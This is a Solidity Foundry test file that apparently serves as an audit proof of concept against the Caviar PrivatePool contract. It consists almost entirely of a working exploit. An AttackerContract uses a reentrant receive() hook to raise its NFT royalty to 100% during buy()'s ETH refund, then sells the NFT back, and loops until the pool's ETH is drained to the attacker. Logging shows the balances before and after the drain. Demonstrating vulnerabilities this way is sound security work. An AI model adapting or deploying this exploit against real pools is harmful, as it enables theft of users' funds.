// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC721Royalty, ERC721} from "@openzeppelin/contracts/token/ERC721/extensions/ERC721Royalty.sol";

import {ERC721TokenReceiver} from "solmate/tokens/ERC721.sol";

import {Fixture} from "../Fixture.sol";
import {PrivatePool} from "../../src/PrivatePool.sol";
import {IStolenNftOracle} from "../../src/interfaces/IStolenNftOracle.sol";

import "forge-std/console.sol";
import "@openzeppelin/contracts/utils/Strings.sol";

/**
 * @title Mock NFT collection contract.
 * @notice This contract follows the EIP721 and EIP2981 standards.
 * @dev Inherits OpenZeppelin's contracts.
 */
contract ERC721RoyaltyCollection is Ownable, ERC721Royalty {
    /// @notice Counter variable for token IDs.
    uint256 public tokenId;

    /**
     * @dev Ownership is given to the deployer (msg.sender).
     * @param _name ERC721 name property.
     * @param _symbol ERC721 symbol property.
     */
    constructor(
        string memory _name,
        string memory _symbol
    ) ERC721(_name, _symbol) {}

    modifier onlyRoyaltyReceiver(uint256 _tokenId) {
        (address receiver, ) = royaltyInfo(_tokenId, 0);
        require(msg.sender == receiver);
        _;
    }

    /**
     * @notice Mints an NFT and sets information regarding royalties.
     * @notice Each NFT costs 1 ETH to mint and the funds go to the DAO behind the project.
     * @param _to The account that the NFT will be minted to.
     * @param _royaltyReceiver The receiver of any royalties paid per each sale.
     * @param _royaltyFeeNumerator The fee percentage in basis points that represents
     * how much of each sale will be transferred to the royalty receiver.
     */
    function mint(
        address _to,
        address _royaltyReceiver,
        uint96 _royaltyFeeNumerator
    ) external payable {
        require(msg.value == 1 ether);
        _mint(_to, tokenId);
        _setTokenRoyalty(tokenId++, _royaltyReceiver, _royaltyFeeNumerator);
    }

    /**
     * @notice Only the current royalty receiver is allowed to
     * determine the new receiver address and the new fee percentage.
     * @param _tokenId The token whose royalty data will be changed.
     * @param _royaltyReceiver The new royalty receiver address (can remain the same).
     * @param _royaltyFeeNumerator The new royalty fee basis points (can remain the same).
     */
    function setTokenRoyalty(
        uint256 _tokenId,
        address _royaltyReceiver,
        uint96 _royaltyFeeNumerator
    ) external onlyRoyaltyReceiver(_tokenId) {
        _setTokenRoyalty(_tokenId, _royaltyReceiver, _royaltyFeeNumerator);
    }

    /**
     * @notice Withdraw all revenue from the NFT sales.
     * @dev This function is only callable by the owner/DAO behind the project.
     */
    function withdraw() external onlyOwner {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }
}

/**
 * @title AttackerContract.
 * @notice The main logic for exploiting the vulnerability in PrivatePool.sol.
 */
contract AttackerContract is Ownable, ERC721TokenReceiver {
    /// @notice The NFT collection contract that is used by the private pool.
    ERC721RoyaltyCollection public nft;

    /// @notice The Caviar private pool that incorrectly calculates royalties.
    PrivatePool public vulnerablePrivatePool;

    /// @notice The target token ID that will be used to perform the exploit.
    uint256 public tokenId;

    /// @notice Needed to reset state after attack is performed.
    uint256 public originalFee;

    /// @notice Helper flags needed to navigate the attack path in the receive() function.
    bool public f1;
    bool public f2;

    /**
     * @param _vulnerablePrivatePool The address of the targeted Caviar private pool.
     * @param _nft The NFT collection address.
     * @param _tokenId The specific NFT that will be used for the exploit.
     */
    constructor(
        address payable _vulnerablePrivatePool,
        address _nft,
        uint256 _tokenId
    ) {
        nft = ERC721RoyaltyCollection(_nft);
        vulnerablePrivatePool = PrivatePool(_vulnerablePrivatePool);

        tokenId = _tokenId;
    }

    /**
     * @notice Executes the attack. Drains the base token balance of the private pool and sends it to the owner.
     * @param iterations How many times to perform the attack in order to drain the entire base token balance of the pool.
     * @param tokenIds An array including only the tokenId that will be used to perform the attack.
     * @param tokenWeights Empty array if the merkle root is bytes32(0).
     * @param proof Empty if the merkle root is bytes32(0).
     */
    function attack(
        uint256 iterations,
        uint256[] calldata tokenIds,
        uint256[] calldata tokenWeights,
        PrivatePool.MerkleMultiProof calldata proof
    ) external payable onlyOwner {
        // Execute attack.
        for (uint256 i; i < iterations; i++) {
            vulnerablePrivatePool.buy{value: msg.value}(
                tokenIds,
                tokenWeights,
                proof
            );
        }

        // Return all assets to the owner/original receiver.
        (bool success, ) = payable(owner()).call{value: address(this).balance}(
            ""
        );

        // Ensure the call was successful.
        require(success);
    }

    /**
     * @notice Main logic for the exploit.
     */
    receive() external payable {
        // Do not allow arbitrary calls.
        require(msg.sender == address(vulnerablePrivatePool));

        // Return if the call comes from PrivatePool.sell().
        if (f2) return;

        // We should enter the next block only if the call
        // comes from the ETH excess refund in PrivatePool.buy().
        if (!f1) {
            // Do not enter again for this iteration.
            f1 = true;

            // Cache the original fee in order to reset it later.
            (, originalFee) = nft.royaltyInfo(tokenId, 10_000);

            // Increase the royalty fee significantly to get back the price we paid for buying it.
            nft.setTokenRoyalty(tokenId, address(this), 10_000);

            // Return to PrivatePool.buy().
            return;
        }

        // Reset the fee.
        nft.setTokenRoyalty(tokenId, address(this), uint96(originalFee));

        // Set the second flag used to not execute any logic if the call comes from PrivatePool.sell().
        f2 = true;

        // Approve the bought NFT to the Caviar private pool.
        nft.approve(address(vulnerablePrivatePool), tokenId);

        // Sell the bought NFT in order to extract base tokens from the vulnerable private pool.
        vulnerablePrivatePool.sell(
            new uint256[](1),
            new uint256[](0),
            PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0)),
            new IStolenNftOracle.Message[](0)
        );

        // Reset state variables so attack can be performed one more iteration.
        delete originalFee;
        delete f1;
        delete f2;
    }
}

contract MaliciousRoyaltyReceiverDrainPrivatePoolTest is Fixture {
    /// @notice The NFT collection contract that is used by the private pool.
    ERC721RoyaltyCollection public nft;

    /// @notice The Caviar private pool that incorrectly calculates royalties.
    PrivatePool public privatePool;

    /// @notice Merkle root is set to bytes32(0) to make setup simpler.
    bytes32 constant MERKLE_ROOT = bytes32(0);

    /// @notice The private pool has initial balance/reserve of 100 ETH (the base token is address(0)).
    uint128 constant VIRTUAL_BASE_TOKEN_RESERVES = 100e18;

    /// @notice The private pool has 5 NFTs, each one with a wight of 1e18 (the merkle root is bytes32(0)).
    uint128 constant VIRTUAL_NFT_RESERVES = 5e18;

    /// @notice The specific NFT that will be used to perform the epxloit.
    /// @notice The attacker should be the royalty receiver of this NFT.
    /// @dev Zero is used so we can pass `new uint256[](1)` as the tokenIds array.
    uint256 tokenId = 0;

    // The attacker. It is set as a royalty receiver to NFT#tokenId that will be used to perform the exploit.
    address receiver;

    function setUp() external {
        // The attacker.
        receiver = vm.addr(1);

        // The NFT collection the will be used by the private pool.
        nft = new ERC721RoyaltyCollection("VoyvodaSec", "VSC");

        _deployPrivatePool();
        _depositNFTs(tokenId);

        _fundEth();

        // Assert setup.
        assertEq(
            privatePool.nft(),
            address(nft),
            "Setup: NFT collection not set correctly."
        );
        assertEq(
            nft.ownerOf(tokenId),
            address(privatePool),
            "Setup: the NFT should initially be deposited to the private pool."
        );

        assertEq(
            privatePool.baseToken(),
            address(0),
            "Setup: the private pool base token should be ETH."
        );
        assertEq(
            address(privatePool).balance,
            VIRTUAL_BASE_TOKEN_RESERVES,
            "Setup: incorrect initial amount of ETH supplied to pool."
        );

        // Log initial state (before attack).
        _logState(" Before the exploit");
    }

    function test_MaliciousRoyaltyReceiverDrainPrivatePool() external {
        // 0. Execute the following steps from the royalty receiver (the attacker) account.
        vm.startPrank(receiver);

        // 1. Deploy the attacker contract that contains the main exploit logic.
        AttackerContract maliciousReceiverContract = new AttackerContract(
            payable(privatePool),
            address(nft),
            tokenId
        );

        assertEq(maliciousReceiverContract.owner(), receiver);

        // 2. Change the royalty receiver for NFT#tokenId to the attacker contract.
        nft.setTokenRoyalty(tokenId, address(maliciousReceiverContract), 10);

        (address newRoyaltyReceiver, ) = nft.royaltyInfo(tokenId, 10_000);
        assertEq(newRoyaltyReceiver, address(maliciousReceiverContract));

        // 3. Execute the attack.
        maliciousReceiverContract.attack{value: 100 ether}(
            4, // 4 iterations are needed to drain the whole private ETH balance having the current setup.
            new uint256[](1), // This will pass the following array as tokenIds - [0].
            new uint256[](0),
            PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0))
        );

        // Log state after pool was drained.
        _logState(" After the exploit");
    }

    // ======================================= Helpers ======================================= //

    /**
     * @notice Deploy and initialize an instance of the vulnerable private pool implementation.
     */
    function _deployPrivatePool() internal {
        // Deploy pool implementation.
        privatePool = new PrivatePool(
            address(factory),
            address(royaltyRegistry),
            address(stolenNftOracle)
        );

        // Initialize pool instance.
        privatePool.initialize(
            address(0),
            address(nft),
            VIRTUAL_BASE_TOKEN_RESERVES,
            VIRTUAL_NFT_RESERVES,
            0,
            0,
            MERKLE_ROOT,
            false,
            true
        );
    }

    /**
     * @notice Simulates deposits of 5 NFTs to the private pool.
     * @param _targetTokenId The specific NFT that will be
     * used by the attacker to perform the exploit.
     */
    function _depositNFTs(uint256 _targetTokenId) internal {
        for (uint256 i = 0; i < 5; i++) {
            // Mint NFTs directly to the Pool to make setup easier.
            nft.mint{value: 1 ether}(
                address(privatePool),
                i == _targetTokenId ? receiver : vm.addr(type(uint64).max), // Set the attacker/royalty receiver account to the passed token only.
                uint96(10)
            );
        }
    }

    /**
     * @notice Funds ETH to the accounts that will need native tokens for this test case.
     */
    function _fundEth() internal {
        vm.deal(address(privatePool), VIRTUAL_BASE_TOKEN_RESERVES);
        vm.deal(receiver, 100e18);
    }

    /**
     * @notice Logs the current state to show the exploit status in the terminal.
     */
    function _logState(string memory state) internal view {
        console.log("");
        console.log("==========================================");
        console.log(state);
        console.log("==========================================");
        console.log(
            string.concat(
                " | Attacker balance:            ",
                string.concat(
                    Strings.toString(receiver.balance / 1e18),
                    ".",
                    Strings.toString((receiver.balance % 1e18) / 1e17)
                ),
                " ETH"
            )
        );
        console.log(
            string.concat(
                " | Pool balance:                ",
                string.concat(
                    Strings.toString(address(privatePool).balance / 1e18),
                    ".",
                    Strings.toString(
                        (address(privatePool).balance % 1e18) / 1e17
                    )
                ),
                " ETH"
            )
        );
        console.log("==========================================");
    }
}